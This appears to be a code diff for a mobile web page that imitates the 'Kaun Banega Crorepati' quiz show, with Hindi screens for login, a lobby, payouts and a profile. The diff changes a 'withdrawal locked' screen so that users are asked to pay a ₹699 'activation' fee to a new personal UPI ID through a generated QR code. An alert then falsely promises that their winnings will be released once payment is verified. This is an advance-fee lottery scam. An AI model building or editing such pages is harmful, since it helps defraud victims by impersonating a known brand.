@@ -17,12 +17,12 @@
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
     body { background: var(--navy-950); color: var(--text); min-height: 100vh; padding-bottom: 70px; overflow-x: hidden; }
 
-    /* Top Navbar - Initially Hidden before login */
+    /* Top Navbar - Hidden before login */
     .top-navbar { height: 60px; background: rgba(6,14,36,0.95); border-bottom: 1px solid var(--border); display: none; align-items: center; justify-content: space-between; padding: 0 14px; position: sticky; top: 0; z-index: 100; }
     .kbc-logo-svg { width: 40px; height: 40px; border-radius: 50%; border: 2px solid var(--gold); box-shadow: 0 0 10px rgba(245,166,35,0.4); display: block; }
     .lang-pill { background: #122452; border: 1px solid var(--border); border-radius: 14px; color: #fff; padding: 4px 8px; font-size: 11px; }
 
-    /* Bottom Nav Bar - Initially Hidden before login */
+    /* Bottom Nav Bar - Hidden before login */
     .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; height: 58px; background: #060e24; border-top: 1px solid var(--border); display: none; justify-content: space-around; align-items: center; z-index: 100; }
     .b-item { display: flex; flex-direction: column; align-items: center; color: var(--muted); font-size: 10px; cursor: pointer; flex: 1; text-align: center; }
     .b-item.active { color: var(--gold); font-weight: bold; }
@@ -50,16 +50,14 @@
     .prof-list { margin: 0 14px; background: #060e24; border: 1px solid var(--border); border-radius: 14px; }
     .prof-row { display: flex; justify-content: space-between; padding: 12px 14px; border-bottom: 1px solid rgba(43,86,179,0.25); font-size: 13px; color: #e2e8f0; }
 
-    /* Winners Ticker Bar */
     .winner-bar { background: rgba(245,166,35,0.1); border: 1px solid rgba(245,166,35,0.25); border-radius: 10px; margin: 10px 14px; padding: 8px 12px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; }
   </style>
 </head>
 <body>
 
-  <!-- Top Navbar (Only visible after login) -->
+  <!-- Top Navbar -->
   <header class="top-navbar" id="mainHeader">
     <div style="display:flex; align-items:center; gap:8px;" onclick="showScreen('screenLobby')">
-      <!-- Permanent Built-in SVG KBC Logo -->
       <svg class="kbc-logo-svg" viewBox="0 0 100 100">
         <circle cx="50" cy="50" r="48" fill="#1b0933" stroke="#f5a623" stroke-width="3"/>
         <circle cx="50" cy="50" r="41" fill="none" stroke="#2563eb" stroke-width="2"/>
@@ -80,7 +78,7 @@
     </div>
   </header>
 
-  <!-- Bottom Nav Bar (Only visible after login) -->
+  <!-- Bottom Nav Bar -->
   <nav class="bottom-nav" id="mainBottomNav">
     <div class="b-item active" id="tabHome" onclick="showScreen('screenLobby')">🏠<br><span>होम</span></div>
     <div class="b-item" id="tabDeposit" onclick="showLockedWithdrawal()">📥<br><span>डिपॉजिट</span></div>
@@ -88,7 +86,7 @@
     <div class="b-item" id="tabMine" onclick="showScreen('screenProfile')">👤<br><span>माइन</span></div>
   </nav>
 
-  <!-- SCREEN 1: LOGIN (Name Updated to 'कौन बनेगा करोड़पति') -->
+  <!-- SCREEN 1: LOGIN -->
   <section class="app-screen active" id="screenLogin">
     <div class="center-card">
       <svg class="kbc-logo-svg" style="width:68px; height:68px; margin:0 auto 10px;" viewBox="0 0 100 100">
@@ -188,7 +186,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 6: DUAL PAYOUT TABS (Image 2 Fix) -->
+  <!-- SCREEN 6: DUAL PAYOUT TABS -->
   <section class="app-screen" id="screenPayout">
     <div class="center-card">
       <div style="font-size:30px;">🏦</div>
@@ -215,7 +213,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 7: WITHDRAWAL LOCKED (Sunil QR) -->
+  <!-- SCREEN 7: WITHDRAWAL LOCKED (New Jkha2525@mvhdfc QR) -->
   <section class="app-screen" id="screenLocked">
     <div class="center-card">
       <div style="background:rgba(239,68,68,0.12); border:1px solid var(--red); border-radius:10px; padding:10px; margin-bottom:12px;">
@@ -232,16 +230,16 @@
       <div style="background:#fff; padding:6px; border-radius:10px; display:inline-block; margin-bottom:6px;">
         <img id="qrImg" src="" alt="UPI QR" style="width:150px; height:150px; display:block;">
       </div>
-      <div style="font-weight:bold; color:var(--gold); font-size:13px;">Pay ₹699 to Sunil</div>
-      <div style="font-size:11px; color:var(--muted); margin-bottom:10px;">UPI: sunil.2185@superyes</div>
+      <div style="font-weight:bold; color:var(--gold); font-size:13px;">Pay ₹699 to JUBER</div>
+      <div style="font-size:11px; color:var(--muted); margin-bottom:10px;">UPI: Jkha2525@mvhdfc</div>
 
       <div class="input-grp"><label>12-DIGIT TRANSACTION / UTR</label><input type="text" placeholder="Enter UTR after payment" maxlength="12"></div>
-      <button type="button" class="btn-gold" onclick="alert('Verification submitted! Sunil ko ₹699 verify hone ke baad funds release ho jayenge.')">Verify Deposit & Unlock</button>
+      <button type="button" class="btn-gold" onclick="alert('Verification submitted! JUBER ko ₹699 verify hone ke baad funds release ho jayenge.')">Verify Deposit & Unlock</button>
       <button type="button" onclick="showScreen('screenLobby')" style="background:transparent; border:none; color:var(--muted); font-size:11px; margin-top:8px; cursor:pointer;">Return to Lobby</button>
     </div>
   </section>
 
-  <!-- SCREEN 8: USER PROFILE (Image 3 Style) -->
+  <!-- SCREEN 8: USER PROFILE -->
   <section class="app-screen" id="screenProfile">
     <div class="prof-hero">
       <div style="display:flex; align-items:center; gap:12px;">
@@ -340,7 +338,6 @@
       document.getElementById('lobbyHiText').innerText = "वापसी पर स्वागत है, " + userPhoneMasked + "!";
       document.getElementById('txtMember').innerText = "Member_" + m.substring(6) + " ✏️";
 
-      // Show top header and bottom nav after login
       document.getElementById('mainHeader').style.display = 'flex';
       document.getElementById('mainBottomNav').style.display = 'flex';
 
@@ -440,7 +437,8 @@
     }
 
     function showLockedWithdrawal() {
-      var upi = "upi://pay?pa=sunil.2185@superyes&pn=Sunil&am=699&cu=INR&tn=Crorepati_Activation";
+      // Official Decoded Merchant URI with Jkha2525@mvhdfc & ₹699
+      var upi = "upi://pay?ver=01&pa=Jkha2525@mvhdfc&pn=JUBER&mc=0000&cu=INR&am=699&mode=01&purpose=00&qrmedium=02&tn=Crorepati_Activation";
       document.getElementById('qrImg').src = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(upi);
       showScreen('screenLocked');
     }
